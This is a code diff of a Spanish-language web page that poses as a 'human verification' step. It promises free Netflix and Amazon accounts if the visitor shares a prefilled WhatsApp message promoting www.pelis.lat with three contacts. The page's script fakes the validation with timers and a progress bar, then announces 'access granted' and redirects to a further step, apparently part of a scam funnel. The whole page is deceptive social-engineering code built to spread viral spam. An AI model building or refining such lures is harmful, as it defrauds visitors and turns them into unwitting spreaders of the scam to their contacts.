@@ -3,80 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verificación Humana</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>Verificación de Seguridad</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background: #0f0f0f; color: white; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .container { width: 85%; max-width: 400px; }
-        
-        .icon-box { font-size: 3rem; margin-bottom: 20px; animation: bounce 2s infinite; }
-        h2 { margin-bottom: 10px; }
-        p { color: #888; font-size: 0.9rem; margin-bottom: 30px; }
-
-        .btn-wa {
-            background: #25D366; color: white; text-decoration: none; padding: 18px; width: 100%; display: block;
-            border-radius: 12px; font-weight: 600; font-size: 1rem; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4);
-            transition: 0.2s; box-sizing: border-box; cursor: pointer;
+        /* RESET Y VARIABLES */
+        :root {
+            --wa: #25D366;
+            --wa-dark: #075E54;
+            --bg: #050505;
+            --glass: rgba(255, 255, 255, 0.08);
+            --border: rgba(255, 255, 255, 0.1);
         }
-        .btn-wa:active { transform: scale(0.95); }
-        .btn-wa:hover { background: #1ebe57; }
 
-        .progress-bar { width: 100%; background: #333; height: 8px; border-radius: 10px; margin-top: 30px; overflow: hidden; }
-        .fill { width: 0%; height: 100%; background: #25D366; transition: width 0.5s; }
+        * {
+            box-sizing: border-box; /* ESTO ARREGLA EL DESBORDAMIENTO */
+            -webkit-tap-highlight-color: transparent;
+        }
 
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        body {
+            background-color: var(--bg);
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* FONDO ANIMADO */
+        .glow-bg {
+            position: absolute; width: 600px; height: 600px;
+            background: radial-gradient(circle, rgba(37, 211, 102, 0.1) 0%, rgba(0,0,0,0) 70%);
+            border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 0; pointer-events: none; animation: pulse 4s infinite alternate;
+        }
+        @keyframes pulse { 0% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); } 100% { opacity: 0.8; transform: translate(-50%, -50%) scale(1.1); } }
+
+        .container {
+            width: 90%; max-width: 400px; z-index: 2; position: relative;
+        }
+
+        /* TARJETA DE CRISTAL */
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 30px 25px; /* Padding interno seguro */
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+
+        /* INSIGNIA */
+        .badge {
+            display: inline-block; padding: 6px 14px; border-radius: 50px;
+            font-size: 11px; font-weight: 800; letter-spacing: 1px;
+            text-transform: uppercase; margin-bottom: 20px;
+            background: rgba(255, 193, 7, 0.15); color: #ffc107; border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+        .badge.success { background: rgba(37, 211, 102, 0.15); color: var(--wa); border-color: var(--wa); }
+
+        h1 { font-size: 1.6rem; margin: 0 0 10px 0; line-height: 1.2; }
+        p { color: #aaa; font-size: 0.9rem; margin-bottom: 30px; line-height: 1.6; }
+
+        /* BOTÓN WHATSAPP (Ajustado) */
+        .btn-wa {
+            display: flex; align-items: center; justify-content: center; gap: 12px;
+            width: 100%; /* Ocupa el 100% del contenedor padre */
+            padding: 18px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white; text-decoration: none; font-weight: 700; font-size: 1rem;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
+            transition: all 0.3s ease; cursor: pointer;
+            margin-bottom: 25px;
+        }
+        .btn-wa:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(37, 211, 102, 0.5); }
+        .btn-wa:active { transform: scale(0.98); }
+
+        /* BARRA DE PROGRESO */
+        .progress-container { text-align: left; margin-bottom: 25px; }
+        .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #ccc; margin-bottom: 8px; }
+        .progress-track { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--wa); border-radius: 10px; transition: width 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
+
+        /* CHECKLIST */
+        .checklist { border-top: 1px solid var(--border); padding-top: 20px; text-align: left; }
+        .check-item { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #666; margin-bottom: 10px; transition: 0.3s; }
+        .check-item.active { color: white; }
+        .icon-circle { width: 20px; height: 20px; border-radius: 50%; background: #222; border: 1px solid #444; display: flex; align-items: center; justify-content: center; font-size: 10px; color: transparent; transition: 0.3s; }
+        .check-item.active .icon-circle { background: var(--wa); border-color: var(--wa); color: black; box-shadow: 0 0 10px rgba(37,211,102,0.4); }
+
+        /* LOADER OVERLAY */
+        .loader-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px);
+            z-index: 10; display: none;
+            flex-direction: column; align-items: center; justify-content: center;
+            border-radius: 24px;
+        }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--wa); border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="icon-box">🛡️</div>
-    <h2>Activar Sistema</h2>
-    <p>Para desbloquear el generador, invita a amigos a obtener sus cuentas gratis.</p>
+    <div class="glow-bg"></div>
 
-    <a href="https://api.whatsapp.com/send?text=¡Hola! Obtén cuenta de Netflix, Amazon y más totalmente GRATIS aquí 😱 👉 www.pelis.lat" 
-       class="btn-wa" 
-       target="_blank" 
-       onclick="trackShare()">
-       📲 Compartir en WhatsApp (<span id="count">0</span>/3)
-    </a>
+    <div class="container">
+        <div class="glass-card">
+            <div class="loader-overlay" id="loader">
+                <div class="spinner"></div>
+                <span style="font-weight: 600; font-size: 14px;">Validando invitaciones...</span>
+            </div>
 
-    <div class="progress-bar"><div class="fill" id="fill"></div></div>
-    <p id="status" style="font-size: 12px; margin-top: 10px; color: #555;">Esperando acción...</p>
-</div>
+            <div id="mainBadge" class="badge">⚠ Verificación Pendiente</div>
+            
+            <h1>Libera tu cuenta</h1>
+            <p>El sistema requiere validación humana. Comparte con <strong>3 contactos</strong> en WhatsApp para generar tus credenciales.</p>
 
-<script>
-    let shares = 0;
-    
-    function trackShare() {
-        // El usuario ya hizo clic y se abrió la nueva pestaña.
-        // Aquí esperamos un poco para simular que el sistema detecta el envío.
-        
-        setTimeout(() => {
-            shares++;
-            
-            // Actualizar contador visual
-            document.getElementById('count').innerText = shares;
-            
-            // Actualizar barra de progreso (33% por cada clic)
-            let percentage = (shares / 3) * 100;
-            if(percentage > 100) percentage = 100;
-            document.getElementById('fill').style.width = percentage + "%";
-            
-            if(shares < 3) {
-                document.getElementById('status').innerText = `Faltan ${3-shares} compartidas más.`;
-            } else {
-                document.getElementById('status').innerText = "✅ Verificado con éxito.";
-                document.getElementById('status').style.color = "#25D366";
-                
-                // Redirigir al siguiente paso
+            <a href="https://api.whatsapp.com/send?text=¡Hola!%20Encontré%20esta%20web%20para%20ver%20Netflix%20y%20Amazon%20GRATIS%20😱%20Entra%20antes%20de%20que%20se%20agoten:%20www.pelis.lat" 
+               class="btn-wa" target="_blank" onclick="handleShare()">
+                <svg width="22" height="22" fill="white" viewBox="0 0 16 16"><path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592z"/></svg>
+                Compartir en WhatsApp
+            </a>
+
+            <div class="progress-container">
+                <div class="progress-info">
+                    <span>Progreso de validación</span>
+                    <span id="txtPercent">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div id="barFill" class="progress-fill"></div>
+                </div>
+            </div>
+
+            <div class="checklist">
+                <div class="check-item" id="step1"><div class="icon-circle">✓</div> 1. Compartir primer contacto</div>
+                <div class="check-item" id="step2"><div class="icon-circle">✓</div> 2. Compartir segundo contacto</div>
+                <div class="check-item" id="step3"><div class="icon-circle">✓</div> 3. Compartir tercer contacto</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let clicks = 0;
+        const maxClicks = 3;
+
+        function handleShare() {
+            // Se simula la espera de regreso de la App/Web
+            setTimeout(() => {
+                if (clicks < maxClicks) {
+                    clicks++;
+                    updateState();
+                }
+            }, 2000); // 2 segundos de delay
+        }
+
+        function updateState() {
+            // Actualizar Porcentaje
+            let percent = (clicks / maxClicks) * 100;
+            document.getElementById('barFill').style.width = percent + "%";
+            document.getElementById('txtPercent').innerText = Math.round(percent) + "%";
+
+            // Actualizar Checklist
+            if (clicks >= 1) document.getElementById('step1').classList.add('active');
+            if (clicks >= 2) document.getElementById('step2').classList.add('active');
+            if (clicks >= 3) document.getElementById('step3').classList.add('active');
+
+            // Finalizar
+            if (clicks >= maxClicks) {
+                const badge = document.getElementById('mainBadge');
+                badge.innerText = "✓ ACCESO CONCEDIDO";
+                badge.classList.add('success');
+
+                // Mostrar pantalla de carga y redirigir
                 setTimeout(() => {
-                    window.location.href = 'paso2_captura.html';
-                }, 1500);
+                    document.getElementById('loader').style.display = 'flex';
+                    setTimeout(() => {
+                        window.location.href = 'paso3_proceso.html'; // Salta directo al proceso final
+                    }, 2000);
+                }, 800);
             }
-        }, 3000); // Esperamos 3 segundos para darle tiempo de "compartir"
-    }
-</script>
-
+        }
+    </script>
 </body>
 </html>
